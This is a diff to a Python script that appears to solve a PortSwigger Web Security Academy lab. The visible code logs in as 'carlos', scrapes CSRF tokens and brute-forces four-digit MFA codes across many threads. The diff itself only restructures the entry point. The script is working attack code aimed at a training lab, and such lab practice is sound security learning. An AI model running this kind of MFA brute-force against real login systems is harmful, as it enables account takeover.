@@ -18,6 +18,7 @@ def gogetem(num):
         mybody1 = "csrf=" + csrf1 + "&username=carlos&password=montoya"
        
         r2 = requests.Session()
+        
         r3 = r2.post("https://" + lab_id + ".web-security-academy.net/login", cookies = myheaders1, data = mybody1, allow_redirects=True)
         csrf2 = str(r3.content).split("csrf")[1].split("\"")[2]
         mybody2 = "csrf=" + csrf2 + "&mfa-code=" + str(i).zfill(4)
@@ -32,7 +33,7 @@ def gogetem(num):
             print("Time Finished (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))
             os._exit(0)
 
-def main():
+if __name__ == '__main__':
     
     with ThreadPoolExecutor() as executor:
         
@@ -40,7 +41,3 @@ def main():
             thread = executor.submit(gogetem, j*500)
 
     print("Done At (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))
-    
-if __name__ == '__main__':
-    
-    main()
